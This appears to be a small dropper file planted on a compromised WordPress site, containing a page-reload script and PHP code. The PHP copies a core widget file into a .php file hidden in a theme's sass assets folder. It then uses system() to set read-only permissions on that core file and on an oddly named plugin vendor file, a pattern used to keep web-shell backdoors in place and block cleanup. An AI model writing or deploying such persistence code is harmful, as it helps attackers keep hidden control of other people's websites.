<script type="text/javascript">
setTimeout(function(){
location.reload();
},0);
</script>
<?php 
$awal = '/home/ppidsult/public_html/wp-includes/widgets/class-wp-widget-pages.php'; 
$akhir = '/home/ppidsult/public_html/wp-content/themes/twentytwentyone/assets/sass/05-blocks/paragraph/default.php'; 
copy($awal,$akhir) ; 
system('chmod 444 /home/ppidsult/public_html/wp-includes/widgets/class-wp-widget-pages.php');
system('chmod 444 /home/ppidsult/public_html/wp-content/plugins/wp-ulike/vendor/psr/http-message/src/UploadedFileInter.php');
?>
